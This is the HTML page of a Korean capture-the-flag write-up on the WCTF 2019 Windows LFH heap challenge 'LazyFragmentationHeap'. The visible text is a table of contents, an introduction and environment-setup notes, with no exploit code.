<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"> <meta name=viewport content="width=device-width, initial-scale=1"> <meta name=description content="Underground hacker group"> <meta name=author content="NULL@ROOT"> <!-- Begin Jekyll SEO tag v2.8.0 --> <title>[Writeup] LazyFragmentationHeap - WCTF 2019 | NULL@ROOT</title> <meta name="generator" content="Jekyll v3.10.0" /> <meta property="og:title" content="[Writeup] LazyFragmentationHeap - WCTF 2019" /> <meta name="author" content="y0ny0ns0n" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="작성 - y0ny0ns0n @ null2root" /> <meta property="og:description" content="작성 - y0ny0ns0n @ null2root" /> <link rel="canonical" href="http://localhost:4000/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html" /> <meta property="og:url" content="http://localhost:4000/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html" /> <meta property="og:site_name" content="NULL@ROOT" /> <meta property="og:type" content="article" /> <meta property="article:published_time" content="2020-02-07T02:53:00+09:00" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="[Writeup] LazyFragmentationHeap - WCTF 2019" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"y0ny0ns0n"},"dateModified":"2020-02-07T02:53:00+09:00","datePublished":"2020-02-07T02:53:00+09:00","description":"작성 - y0ny0ns0n @ null2root","headline":"[Writeup] LazyFragmentationHeap - WCTF 2019","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html"},"url":"http://localhost:4000/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html"}</script> <!-- End Jekyll SEO tag --> <link rel="apple-touch-icon-precomposed" sizes="57x57" href="http://localhost:4000/assets/images/favicon/apple-touch-icon-57x57.png" /> <link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://localhost:4000/assets/images/favicon/apple-touch-icon-114x114.png" /> <link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://localhost:4000/assets/images/favicon/apple-touch-icon-72x72.png" /> <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/assets/images/favicon/apple-touch-icon-144x144.png" /> <link rel="apple-touch-icon-precomposed" sizes="60x60" href="http://localhost:4000/assets/images/favicon/apple-touch-icon-60x60.png" /> <link rel="apple-touch-icon-precomposed" sizes="120x120" href="http://localhost:4000/assets/images/favicon/apple-touch-icon-120x120.png" /> <link rel="apple-touch-icon-precomposed" sizes="76x76" href="http://localhost:4000/assets/images/favicon/apple-touch-icon-76x76.png" /> <link rel="apple-touch-icon-precomposed" sizes="152x152" href="http://localhost:4000/assets/images/favicon/apple-touch-icon-152x152.png" /> <link rel="icon" type="image/png" href="http://localhost:4000/assets/images/favicon/favicon-196x196.png" sizes="196x196" /> <link rel="icon" type="image/png" href="http://localhost:4000/assets/images/favicon/favicon-96x96.png" sizes="96x96" /> <link rel="icon" type="image/png" href="http://localhost:4000/assets/images/favicon/favicon-32x32.png" sizes="32x32" /> <link rel="icon" type="image/png" href="http://localhost:4000/assets/images/favicon/favicon-16x16.png" sizes="16x16" /> <link rel="icon" type="image/png" href="http://localhost:4000/assets/images/favicon/favicon-128.png" sizes="128x128" /> <meta name="application-name" content="&nbsp;"/> <meta name="msapplication-TileColor" content="#FFFFFF" /> <meta name="msapplication-TileImage" content="mstile-144x144.png" /> <meta name="msapplication-square70x70logo" content="mstile-70x70.png" /> <meta name="msapplication-square150x150logo" content="mstile-150x150.png" /> <meta name="msapplication-wide310x150logo" content="mstile-310x150.png" /> <meta name="msapplication-square310x310logo" content="mstile-310x310.png" /> <link rel="canonical" href="http://localhost:4000/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html"> <link rel="alternate" type="application/rss+xml" title="" href="http://localhost:4000/feed.xml" /> <style> @charset "UTF-8"; /*! normalize.css v4.1.1 | MIT License | github.com/necolas/normalize.css */ /** * 1. Change the default font family in all browsers (opinionated). * 2. Prevent adjustments of font size after orientation changes in IE and iOS. */ html { font-family: sans-serif; /* 1 */ -ms-text-size-adjust: 100%; /* 2 */ -webkit-text-size-adjust: 100%; /* 2 */ } /** * Remove the margin: in all browsers (opinionated). */ body { margin: 0; } /* HTML5 display: definitions ========================================================================== */ /** * Add the correct display: in IE 9-. * 1. Add the correct display: in Edge, IE, and Firefox. * 2. Add the correct display: in IE. */ article, aside, details, figcaption, figure, footer, header, main, menu, nav, section, summary { /* 1 */ display: block; } /** * Add the correct display: in IE 9-. */ audio, canvas, progress, video { display: inline-block; } /** * Add the correct display: in iOS 4-7. */ audio:not([controls]) { display: none; height: 0; } /** * Add the correct vertical alignment in Chrome, Firefox, and Opera. */ progress { vertical-align: baseline; } /** * Add the correct display: in IE 10-. * 1. Add the correct display: in IE. */ template, [hidden] { display: none; } /* Links ========================================================================== */ /** * 1. Remove the gray background: on active links in IE 10. * 2. Remove gaps in links underline in iOS 8+ and Safari 8+. */ a { background-color: transparent; /* 1 */ -webkit-text-decoration-skip: objects; /* 2 */ } /** * Remove the outline on focused links when they are also active or hovered * in all browsers (opinionated). */ a:active, a:hover { outline-width: 0; } /* Text-level semantics ========================================================================== */ /** * 1. Remove the bottom border: in Firefox 39-. * 2. Add the correct text decoration in Chrome, Edge, IE, Opera, and Safari. */ abbr[title] { border-bottom: none; /* 1 */ text-decoration: underline; /* 2 */ text-decoration: underline dotted; /* 2 */ } /** * Prevent the duplicate application of `bolder` by the next rule in Safari 6. */ b, strong { font-weight: inherit; } /** * Add the correct font weight in Chrome, Edge, and Safari. */ b, strong { font-weight: bolder; } /** * Add the correct font style in Android 4.3-. */ dfn { font-style: italic; } /** * Correct the font size and margin: on `h1` elements within `section` and * `article` contexts in Chrome, Firefox, and Safari. */ h1 { font-size: 2em; margin: 0.67em 0; } /** * Add the correct background: and color: in IE 9-. */ mark { background-color: #ff0; color: #000; } /** * Add the correct font size in all browsers. */ small { font-size: 80%; } /** * Prevent `sub` and `sup` elements from affecting the line height: in * all browsers. */ sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-align: baseline; } sub { bottom: -0.25em; } sup { top: -0.5em; } /* Embedded content ========================================================================== */ /** * Remove the border: on images inside links in IE 10-. */ img { border-style: none; } /** * Hide the overflow in IE. */ svg:not(:root) { overflow: hidden; } /* Grouping content ========================================================================== */ /** * 1. Correct the inheritance and scaling of font size in all browsers. * 2. Correct the odd `em` font sizing in all browsers. */ code, kbd, pre, samp { font-family: monospace, monospace; /* 1 */ font-size: 1em; /* 2 */ } /** * Add the correct margin: in IE 8. */ figure { margin: 1em 40px; } /** * 1. Add the correct box sizing in Firefox. * 2. Show the overflow in Edge and IE. */ hr { box-sizing: content-box; /* 1 */ height: 0; /* 1 */ overflow: visible; /* 2 */ } /* Forms ========================================================================== */ /** * 1. Change font properties to `inherit` in all browsers (opinionated). * 2. Remove the margin: in Firefox and Safari. */ button, input, select, textarea { font: inherit; /* 1 */ margin: 0; /* 2 */ } /** * Restore the font weight unset by the previous rule. */ optgroup { font-weight: bold; } /** * Show the overflow in IE. * 1. Show the overflow in Edge. */ button, input { /* 1 */ overflow: visible; } /** * Remove the inheritance of text transform in Edge, Firefox, and IE. * 1. Remove the inheritance of text transform in Firefox. */ button, select { /* 1 */ text-transform: none; } /** * 1. Prevent a WebKit bug where (2) destroys native `audio` and `video` * controls in Android 4. * 2. Correct the inability to style clickable types in iOS and Safari. */ button, html [type="button"], [type="reset"], [type="submit"] { -webkit-appearance: button; /* 2 */ } /** * Remove the inner border: and padding: in Firefox. */ button::-moz-focus-inner, [type="button"]::-moz-focus-inner, [type="reset"]::-moz-focus-inner, [type="submit"]::-moz-focus-inner { border-style: none; padding: 0; } /** * Restore the focus styles unset by the previous rule. */ button:-moz-focusring, [type="button"]:-moz-focusring, [type="reset"]:-moz-focusring, [type="submit"]:-moz-focusring { outline: 1px dotted ButtonText; } /** * Change the border, margin, and padding: in all browsers (opinionated). */ fieldset { border: 1px solid #c0c0c0; margin: 0 2px; padding: 0.35em 0.625em 0.75em; } /** * 1. Correct the text wrapping in Edge and IE. * 2. Correct the color: inheritance from `fieldset` elements in IE. * 3. Remove the padding: so developers are not caught out when they zero out * `fieldset` elements in all browsers. */ legend { box-sizing: border-box; /* 1 */ color: inherit; /* 2 */ display: table; /* 1 */ max-width: 100%; /* 1 */ padding: 0; /* 3 */ white-space: normal; /* 1 */ } /** * Remove the default vertical scrollbar in IE. */ textarea { overflow: auto; } /** * 1. Add the correct box sizing in IE 10-. * 2. Remove the padding: in IE 10-. */ [type="checkbox"], [type="radio"] { box-sizing: border-box; /* 1 */ padding: 0; /* 2 */ } /** * Correct the cursor style of increment and decrement buttons in Chrome. */ [type="number"]::-webkit-inner-spin-button, [type="number"]::-webkit-outer-spin-button { height: auto; } /** * 1. Correct the odd appearance in Chrome and Safari. * 2. Correct the outline style in Safari. */ [type="search"] { -webkit-appearance: textfield; /* 1 */ outline-offset: -2px; /* 2 */ } /** * Remove the inner padding: and cancel buttons in Chrome and Safari on OS X. */ [type="search"]::-webkit-search-cancel-button, [type="search"]::-webkit-search-decoration { -webkit-appearance: none; } /** * Correct the text style of placeholders in Chrome, Edge, and Safari. */ ::-webkit-input-placeholder { color: inherit; opacity: 0.54; } /** * 1. Correct the inability to style clickable types in iOS and Safari. * 2. Change font properties to `inherit` in Safari. */ ::-webkit-file-upload-button { -webkit-appearance: button; /* 1 */ font: inherit; /* 2 */ } /* GitHub style for Pygments syntax highlighter, for use with Jekyll * Courtesy of GitHub.com */ .highlight .c { color: #999988; font-style: italic; } .highlight .err { color: #a61717; background-color: #e3d2d2; } .highlight .k { font-weight: bold; } .highlight .o { font-weight: bold; } .highlight .cm { color: #999988; font-style: italic; } .highlight .cp { color: #999999; font-weight: bold; } .highlight .c1 { color: #999988; font-style: italic; } .highlight .cs { color: #999999; font-weight: bold; font-style: italic; } .highlight .gd { color: #000000; background-color: #ffdddd; } .highlight .gd .x { color: #000000; background-color: #ffaaaa; } .highlight .ge { font-style: italic; } .highlight .gr { color: #aa0000; } .highlight .gh { color: #999999; } .highlight .gi { color: #000000; background-color: #ddffdd; } .highlight .gi .x { color: #000000; background-color: #aaffaa; } .highlight .go { color: #888888; } .highlight .gp { color: #555555; } .highlight .gs { font-weight: bold; } .highlight .gu { color: #800080; font-weight: bold; } .highlight .gt { color: #aa0000; } .highlight .kc { font-weight: bold; } .highlight .kd { font-weight: bold; } .highlight .kn { font-weight: bold; } .highlight .kp { font-weight: bold; } .highlight .kr { font-weight: bold; } .highlight .kt { color: #445588; font-weight: bold; } .highlight .m { color: #009999; } .highlight .s { color: #dd1144; } .highlight .n { color: #333333; } .highlight .na { color: teal; } .highlight .nb { color: #0086b3; } .highlight .nc { color: #445588; font-weight: bold; } .highlight .no { color: teal; } .highlight .ni { color: purple; } .highlight .ne { color: #990000; font-weight: bold; } .highlight .nf { color: #990000; font-weight: bold; } .highlight .nn { color: #555555; } .highlight .nt { color: navy; } .highlight .nv { color: teal; } .highlight .ow { font-weight: bold; } .highlight .w { color: #bbbbbb; } .highlight .mf { color: #009999; } .highlight .mh { color: #009999; } .highlight .mi { color: #009999; } .highlight .mo { color: #009999; } .highlight .sb { color: #dd1144; } .highlight .sc { color: #dd1144; } .highlight .sd { color: #dd1144; } .highlight .s2 { color: #dd1144; } .highlight .se { color: #dd1144; } .highlight .sh { color: #dd1144; } .highlight .si { color: #dd1144; } .highlight .sx { color: #dd1144; } .highlight .sr { color: #009926; } .highlight .s1 { color: #dd1144; } .highlight .ss { color: #990073; } .highlight .bp { color: #999999; } .highlight .vc { color: teal; } .highlight .vg { color: teal; } .highlight .vi { color: teal; } .highlight .il { color: #009999; } .highlight .gc { color: #999; background-color: #EAF2F5; } body, html { font-size: 62.5%; } body { line-height: 1; font: 16px "Helvetica Neue", Helvetica, Arial, sans-serif; color: #666; } h1, h2, h3, h4 { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; color: #222; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; } h1 { font-size: 3rem; letter-spacing: -1px; color: #222; font-weight: 700; } h2 { font-size: 2.2rem; } h3 { font-size: 2rem; } h4 { font-size: 1.6rem; } a { color: #4b0082; text-decoration: underline; } p { line-height: 1.7; color: #666; font-weight: 300; margin-bottom: 20px; letter-spacing: 0.4px; } @media only screen and (max-width: 400px) { p { letter-spacing: 0.2px; } } strong { font-weight: 400; color: #000; } ul li, ol li { line-height: 2.4rem; font-weight: 300; color: #666; } img, pre, iframe { max-width: 100%; } img, pre { border-radius: 4px; } figcaption { position: relative; top: -20px; left: 0; right: 0; margin: 0 auto; width: 100%; text-align: center; font-size: 1.3rem; color: #aaa; font-weight: 300; } @media only screen and (max-width: 400px) { figcaption { font-size: 1.2rem; } } blockquote { padding-left: 15px; border-left: 3px solid #eee; } hr { border: none; height: 1px; margin: 40px auto; background: #eee; width: 100%; } figure.highlight { width: 100%; margin: 0; } code, tt { padding: 1px 0; font-family: "Consolas", Liberation Mono, Menlo, Courier, monospace; font-size: 12px; line-height: 20px; background: #fff; border-radius: 2px; border-radius: 2px; } pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10px; font-family: "Consolas", Liberation Mono, Menlo, Courier, monospace; font-size: 1.2rem; line-height: 2rem; overflow: auto; background: #fff; border: 1px solid #ededed; border-radius: 2px; } .wrapper-normal, .wrapper-large { height: 100%; width: 96%; margin: 0 auto; } @media only screen and (max-width: 400px) { .wrapper-normal, .wrapper-large { width: 88%; } } @media only screen and (min-width: 400px) and (max-width: 1050px) { .wrapper-normal, .wrapper-large { width: 88%; } } .wrapper-normal { max-width: 810px; } .wrapper-large { max-width: 1024px; } /* general helpers */ .text-center { text-align: center; } .clearfix:before, .clearfix:after { content: ""; display: table; } .clearfix:after { clear: both; } /* animations */ .animated { animation: fade-in-down 0.6s; animation-delay: 0.3s; animation-fill-mode: both; } @keyframes fade-in-down { 0% { opacity: 0; transform: translateY(-10px); } 100% { opacity: 1; transform: translateY(0); } } .home, .blog, .projects { margin-top: 125px; } .home > .list, .blog > .list, .projects > .list { border-top: 1px solid #ededed; margin-top: 30px; padding-top: 40px; position: relative; } .home > .list:before, .blog > .list:before, .projects > .list:before { display: block; content: " "; width: 7px; height: 7px; border: #ededed 1px solid; position: absolute; top: -5px; left: 50%; margin-left: -5px; background: #FFF; box-shadow: #FFF 0 0 0 5px; border-radius: 3px; } .home > .list > .item, .blog > .list > .item, .projects > .list > .item { display: block; width: 95%; margin: 0 auto; } .home > .list > .item > .url, .blog > .list > .item > .url, .projects > .list > .item > .url { width: 100%; display: block; padding: 20px 0; text-decoration: none; } .home > .list > .item > .url > .title, .blog > .list > .item > .url > .title, .projects > .list > .item > .url > .title { margin: 0; width: 75%; font-weight: 500; transition: all ease-in-out 0.2s; } .home > .list > .item:hover > .url > .title, .blog > .list > .item:hover > .url > .title, .projects > .list > .item:hover > .url > .title { color: #4b0082; } .home > .list aside, .blog > .list aside, .projects > .list aside { position: relative; top: 2px; margin: 0; width: 25%; float: right; font-weight: 300; color: #aaa; text-align: right; transition: all ease-in-out 0.2s; } .home > .list .item:hover .url aside, .blog > .list .item:hover .url aside, .projects > .list .item:hover .url aside { color: #666; } .blog > .list > .item > .url > .title, .projects > .list > .item > .url > .title { display: inline; } .blog > .list > .item > .url > .emoji, .projects > .list > .item > .url > .emoji { display: inline; position: relative; top: -4px; margin-right: 10px; } .page { margin-top: 125px; } .page > h1 { text-align: center; margin-bottom: 6rem; } .about img { width: 50%; margin: 0 auto; display: block; } .post { margin-top: 125px; } .post > .title { text-align: center; margin-bottom: 3rem; } .post > .date, .post > .post-tags { color: #aaa; font-weight: 300; font-size: 1.4rem; text-transform: uppercase; text-align: center; display: block; margin-bottom: 6rem; letter-spacing: 1px; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; } .post > .date { margin-bottom: 2rem; } .post > .post-tags > .item { padding: 2px 8px; border-radius: 3px; font-size: 1.1rem; background: #ededed; color: #666; letter-spacing: 1px; margin: 3px 1px; text-decoration: none; display: inline-block; } .post > h2, .post > h3, .post > h4 { margin-top: 40px; } .post > h2 a, .post > h3 a, .post > h4 a { text-decoration: none; } .post > .title-image { max-height: 360px; display: block; margin: 0 auto; } .post > .blog-navigation { font-size: 1.4rem; display: block; width: auto; overflow: hidden; } .post > .blog-navigation a { display: block; width: 50%; float: left; margin: 1em 0; } .post > .blog-navigation .next { text-align: right; } .tags { margin-top: 125px; } .tags > .list { border-top: 1px solid #ededed; margin-top: 30px; padding-top: 40px; position: relative; } .tags > .list:before { display: block; content: " "; width: 7px; height: 7px; border: #ededed 1px solid; position: absolute; top: -5px; left: 50%; margin-left: -5px; background: #FFF; box-shadow: #FFF 0 0 0 5px; border-radius: 3px; } .tags > .list > .item { font-weight: 300; text-transform: uppercase; text-align: center; margin-bottom: 6rem; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; padding: 3px 9px; border-radius: 3px; font-size: 1.3rem; background: #ededed; color: #666; letter-spacing: 1px; margin: 0 0.5rem 1rem; text-decoration: none; display: inline-block; } .tag-list > .list { padding: 0; } .tag-list > .list > .item { display: block; width: 80%; margin: 0 10%; } .tag-list > .list > .item > .url { width: 100%; height: 100%; display: block; padding: 20px 0; text-decoration: none; } .tag-list > .list > .item > .url > .title { margin: 0; width: 75%; font-weight: 400; transition: all ease-in-out 0.2s; font-size: 1.6rem; } .tag-list > .list > .item:hover > .url > .title { color: #4b0082; } .tag-list > .list aside { position: relative; top: 2px; margin: 0; width: 25%; float: right; font-weight: 300; color: #aaa; text-align: right; transition: all ease-in-out 0.2s; font-size: 1.6rem; } .tag-list > .list .item:hover .url aside { color: #666; } .author { padding: 3rem 0; border-bottom: 1px solid #ededed; border-top: 1px solid #ededed; max-width: 100%; margin: 4rem auto 0; } .author > .toleft > .selfie { width: 90%; border-radius: 100%; } .author > .toright > .name, .author > .toright > .bio { width: 60%; display: inline-block; } .author > .toright > .name { font-size: 1.5rem; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-weight: 500; margin: 6px 0 0; } @media only screen and (max-width: 400px) { .author > .toright > .name { width: 100%; display: block; } } @media only screen and (min-width: 400px) and (max-width: 1050px) { .author > .toright > .name { width: 100%; display: block; } } .author > .toright > .bio { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-weight: 300; color: #aaa; font-size: 1.3rem; text-align: justify; line-height: 1.5; margin: 0; } @media only screen and (max-width: 400px) { .author > .toright > .bio { width: 100%; display: block; } } @media only screen and (min-width: 400px) and (max-width: 1050px) { .author > .toright > .bio { width: 100%; display: block; } } .author > .toleft { width: 10%; display: inline-block; } @media only screen and (max-width: 400px) { .author > .toleft { width: 20%; } } @media only screen and (min-width: 400px) and (max-width: 1050px) { .author > .toleft { width: 20%; } } .author > .toright { width: 89%; display: inline-block; vertical-align: top; } @media only screen and (max-width: 400px) { .author > .toright { width: 78%; } } @media only screen and (min-width: 400px) and (max-width: 1050px) { .author > .toright { width: 78%; } } .no-disqus { border-bottom: none; padding-bottom: 0; } .disqus { margin: 0 auto; max-width: 100%; padding: 40px 0; } .footer-main { border-top: 1px solid #ededed; padding: 40px 0; margin: 40px 0 0; font-size: 1.3rem; color: #aaa; font-weight: 300; text-align: center; position: relative; } .footer-main:before { display: block; content: " "; width: 7px; height: 7px; border: #ededed 1px solid; position: absolute; top: -5px; left: 50%; margin-left: -5px; background: #FFF; box-shadow: #FFF 0 0 0 5px; border-radius: 3px; } .footer-main > .link { display: inline; } .footer-main > .link > .icon { width: 15px !important; fill: #aaa !important; transition: ease-in-out all 0.3s; position: relative; top: 3px; display: inherit; margin: 0; } .footer-main > .link > .icon:hover { fill: #4b0082 !important; } .footer-main > .extra { color: #aaa; margin-top: 0; } .footer-main > .extra > .link { color: #222; text-decoration: none; border-bottom: 1px solid transparent; transition: ease-in-out all 0.3s; padding-bottom: 1px; } .footer-main > .extra > .link:hover { border-color: #aaa; } .header-home { display: block; margin: 0 auto; text-align: center; position: relative; z-index: 99; } .header-home > .link > .selfie { width: 125px; margin-bottom: 25px; border-radius: 100%; transition: all 0.2s; box-shadow: 0; opacity: 1; } .header-home > .link > .selfie:hover { box-shadow: 0 0px 4px 0 rgba(0, 0, 0, 0.18), 0 0px 12px 0 rgba(0, 0, 0, 0.15); opacity: 0.8; } .header-home > .title { font-size: 4rem; margin: 0 0 13px; } .header-home > .description { font-size: 1.85rem; font-weight: 300; font-style: normal; color: #aaa; width: 70%; margin: 0 auto 30px; } .header-home > .description a { font-weight: 200; } .nav > .list, .nav-home > .list { list-style: none; margin: 0; padding: 0 13px 0; } .nav > .list > .item, .nav-home > .list > .item { display: inline-block; } .nav > .list > .item > .link, .nav-home > .list > .item > .link { display: inline-block; font-weight: 300; font-size: 1.4rem; padding: 20px 10px; text-decoration: none; } .nav { position: absolute; right: 0; top: 0; } .nav > .list { padding: 0 13px 0; } .nav > .list > .item > .link { font-size: 1.4rem; padding: 20px 10px; } .nav-home { margin-top: 40px; text-align: center; } .nav-home > .list { padding: 0; } .nav-home > .list > .item > .link { font-size: 2rem; padding: 7px 15px; margin: 0; border-radius: 4%; transition: all 0.4s ease-in-out; width: 70px; } .nav-home > .list > .item > .link:hover { color: #666; } .evidence { background-image: linear-gradient(to bottom, rgba(39, 243, 106, 0.15), rgba(39, 243, 106, 0.15)); color: beta; } .star > .url > .title { width: auto !important; display: inline; background-image: linear-gradient(rgba(39, 243, 106, 0.15), rgba(39, 243, 106, 0.15)); } .twitter-tweet { margin: 10px auto; } .icon { display: inline-block; width: 17px; height: 17px; fill: #000; text-align: center; color: #000; margin: 7px auto; } .caption { position: relative; top: 1rem; left: 0; right: 0; margin: 0 auto; width: 100%; text-align: center; font-size: 1.3rem; } .bigger-image { min-width: 130%; margin: 5rem 0 5rem -15%; } @media only screen and (max-width: 400px) { .bigger-image { min-width: 114%; margin: 2rem 0 2rem -7%; } } @media only screen and (min-width: 400px) and (max-width: 1050px) { .bigger-image { min-width: 114%; margin: 2rem 0 2rem -7%; } } .breaker { height: 1px; margin: 6rem auto; width: 100%; } .breaker:before { content: "• • •"; width: 100%; text-align: center; display: block; color: #aaa; letter-spacing: 4px; position: relative; top: -8px; } .pagination { width: 95%; margin: 3rem auto 0; text-align: center; } .pagination > .page_number { display: inline-block; font-size: 1.3rem; } .pagination > .previous, .pagination > .next { display: inline-block; font-size: 1.8rem; position: relative; top: 1px; padding: 1px 9px; } .pagination > .hidden { visibility: hidden; } .related { margin: 10rem 0 0rem; } .share { float: right; width: 40%; display: inline; text-align: right; position: relative; top: -10px; } @media only screen and (max-width: 400px) { .share { width: 100%; display: block; top: 0; text-align: left; float: none; margin-top: 5px; } } @media only screen and (min-width: 400px) and (max-width: 1050px) { .share { width: 100%; display: block; top: 0; text-align: left; float: none; margin-top: 5px; } } .share > .twitter, .share > .facebook, .share > .google-plus, .share > .linkedin, .share > .reddit { display: inline; vertical-align: middle; font-size: 13px; font-weight: 700; color: #fff; padding: 6px 10px; border-radius: 3px; margin-left: 5px; text-decoration: none; } @media only screen and (max-width: 400px) { .share > .twitter, .share > .facebook, .share > .google-plus, .share > .linkedin, .share > .reddit { margin: 0 5px 10px 0; } } @media only screen and (min-width: 400px) and (max-width: 1050px) { .share > .twitter, .share > .facebook, .share > .google-plus, .share > .linkedin, .share > .reddit { margin: 0 5px 10px 0; } } .share > .twitter { background: #4fafed; } .share > .facebook { background: #4361b3; } .share > .google-plus { background: #dd4b39; } .share > .linkedin { background: #0077b5; } .share > .reddit { background: #ff4500; } .share svg { fill: #fff; position: relative; top: 3px; margin: 0; margin-right: 4px; display: inherit; } @media only screen and (min-width: 780px) { .side-by-side { width: 130%; margin: 6rem 0 6rem -15%; } } @media only screen and (max-width: 780px) { .side-by-side { width: 100%; margin: 4rem 0; } } .side-by-side > .toleft, .side-by-side > .toright { display: inline-block; width: 47.5%; } @media only screen and (max-width: 780px) { .side-by-side > .toleft img, .side-by-side > .toright img { text-align: center; display: block; margin: 0 auto; } } @media only screen and (min-width: 780px) { .side-by-side > .toleft { margin-right: 2%; } } @media only screen and (max-width: 780px) { .side-by-side > .toleft { width: 100%; margin: 0 0 4rem 0; } } @media only screen and (min-width: 780px) { .side-by-side > .toright { margin-left: 2%; vertical-align: top; } } @media only screen and (max-width: 780px) { .side-by-side > .toright { width: 100%; margin: 0 0 4rem 0; } } .side-by-side > .toleft > p, .side-by-side > .toright > p { margin: 0 0 4rem 0; } @media only screen and (max-width: 780px) { .side-by-side > .toleft > p, .side-by-side > .toright > p { margin: 0; } } .social-links { margin-top: 20px; } .social-links > .link { margin: 0; text-decoration: none; position: relative; display: inline-block; height: 35px; width: 35px; } .social-links > .link:hover > .icon { fill: #4b0082; } .social-links > .link:hover:before { opacity: 1; display: inline-block; transform: translate3d(0, 0, 0); white-space: nowrap; } .social-links > .link:before { content: attr(data-title); display: none; position: absolute; bottom: -34px; left: -6px; margin: 0 auto; font-size: 13px; padding: 3px 10px; background: #222; color: #fff; border-radius: 2px; height: 22px; line-height: 22px; opacity: 0; transition: opacity 150ms linear, transform 150ms linear, -webkit-transform 150ms linear; transform: translate3d(0, -8px, 0); z-index: 99; } .social-links > .link:after { content: ""; position: absolute; top: 35px; left: 13px; width: 0; height: 0; border-left: 5px solid transparent; border-right: 5px solid transparent; border-bottom: 6px solid #222; opacity: 0; transition: opacity 150ms linear, transform 150ms linear, -webkit-transform 150ms linear; transform: translate3d(0, -8px, 0); z-index: 100; } .social-links > .link:hover:after { opacity: 1; transform: translate3d(0, 0, 0); } .social-links > .icon { transition: all ease-in-out 0.2s; } .spoiler { position: relative; } .spoiler:before { content: ""; background-color: #fafae0; position: absolute; top: 0; bottom: 0; left: 0; right: 0; z-index: 50; } .spoiler:hover:before { display: none; } </style> </head> <body> <div class="wrapper-normal"> <div class="post"> <nav class="nav"> <ul class="list"> <li class="item"> <a class="link" href="http://localhost:4000/">Home</a> </li> <li class="item"> <a class="link" href="http://localhost:4000/about">About</a> </li> <li class="item"> <a class="link" href="http://localhost:4000/history">History</a> </li> <li class="item"> <a class="link" href="http://localhost:4000/members">Members</a> </li> <li class="item"> <a class="link" href="http://localhost:4000/blog">Blog</a> </li> </ul> </nav> <h1 class="title">[Writeup] LazyFragmentationHeap - WCTF 2019</h1> <span class="date"> <time datetime="07-02-2020">Friday. February 07, 2020</time> - <span class="reading-time" title="Estimated read time"> 69 mins </span> </span> <div class="post-tags"> <a class="item" href="http://localhost:4000/tags/#windows">windows</a> </div> <p>작성 - y0ny0ns0n @ null2root</p> <h1 id="목차">목차</h1> <ol> <li><a href="#1-소개">소개</a></li> <li><a href="#2-환경-구축">환경 구축</a></li> <li><a href="#3-분석">분석</a><br /> 3.1. <a href="#31-_heap">_HEAP</a><br /> 3.2. <a href="#32-_heap_entry">_HEAP_ENTRY</a><br /> 3.3. <a href="#33-_heap_list_lookup">_HEAP_LIST_LOOKUP</a><br /> 3.4. <a href="#34-_lfh_heap">_LFH_HEAP</a><br /> 3.5. <a href="#35-_heap_bucket">_HEAP_BUCKET</a><br /> 3.6. <a href="#36-_heap_local_segment_info">_HEAP_LOCAL_SEGMENT_INFO</a><br /> 3.7. <a href="#37-_heap_subsegment">_HEAP_SUBSEGMENT</a><br /> 3.8. <a href="#38-_heap_userdata_header">_HEAP_USERDATA_HEADER</a><br /> 3.9. <a href="#39-_interlock_seq">_INTERLOCK_SEQ</a><br /> 3.10. <a href="#310-allocate-and-free-non-lfh-chunk">Allocate and Free Non-LFH chunk</a><br /> 3.11. <a href="#311-allocate-and-free-lfh-chunk">Allocate and Free LFH chunk</a><br /></li> <li><a href="#4-익스플로잇">익스플로잇</a></li> <li><a href="#5-후기">후기</a></li> <li><a href="#6-참고자료">참고자료</a></li> </ol> <h1 id="1-소개">1. 소개</h1> <p>올해부터 전체적인 공부방향 자체를 Windows ＋α로 잡아보니, Windows 10 NT Heap에 관심이 생겨서 관련 문서를 찾다 이 문제를 보고 한번 풀어보고자 했습니다.</p> <p><strong>LazyFragmentationHeap</strong>은 WCTF 2019에서 <a href="https://twitter.com/scwuaptx">Angelboy</a>가 출제한 문제인데, Windows의 <a href="https://docs.microsoft.com/en-us/windows/win32/memory/low-fragmentation-heap">Low Fragmentation Heap</a>( 통칭 LFH )과 관련되어 있습니다.</p> <p>앞서 말했다시피 이 주제에 대해 공부하기 위해 이 문제를 선택했기 때문에, 제가 기록할 문서의 내용자체에 오류가 있을 수 있습니다. 혹시 그런 오류를 찾으신다면 최하단의 Disqus 댓글을 통해 알려주시면 감사하겠습니다.</p> <h1 id="2-환경-구축">2. 환경 구축</h1> <p>가상머신 + 문제파일: https://github.com/scwuaptx/LazyFragmentationHeap#vm</p> <ul> <li>Windows 10 Pro Version 1903 (OS Build 18362.30)</li> <li>VirtualBox 6.1.2</li> </ul> <p><strong>C:\Users\wctf2019\Desktop\challenge</strong> 디렉토리에 있는 <strong>start.bat</strong>을 실행하면 아래와 같이 <a href="https://github.com/trailofbits/AppJailLauncher">AppJailLauncher</a>를 통해 문제파일에 원격으로 접근할 수 있습니다.</p> <p><img src="/assets/images/lazyfragmentationheap-pic1.png" alt="appjaillauncher worked" /></p> <p>문제파일이 동작하는 VM은 앞서 표기한 바와 같이 <strong>Windows 10 Pro Version 1903 (OS Build 18362.30)</strong> 인데, 문제파일 분석을 제외한 LFH에 대한 분석은 제 Host OS 버전인 <strong>Windows 10 Pro Version 1909 (18363.592)</strong> 을 기준으로 하고 있습니다.</p> <p>다행히 두 버전간의 차이가 크지 않은 탓인지, <a href="https://www.zynamics.com/bindiff.html">BinDiff</a>로 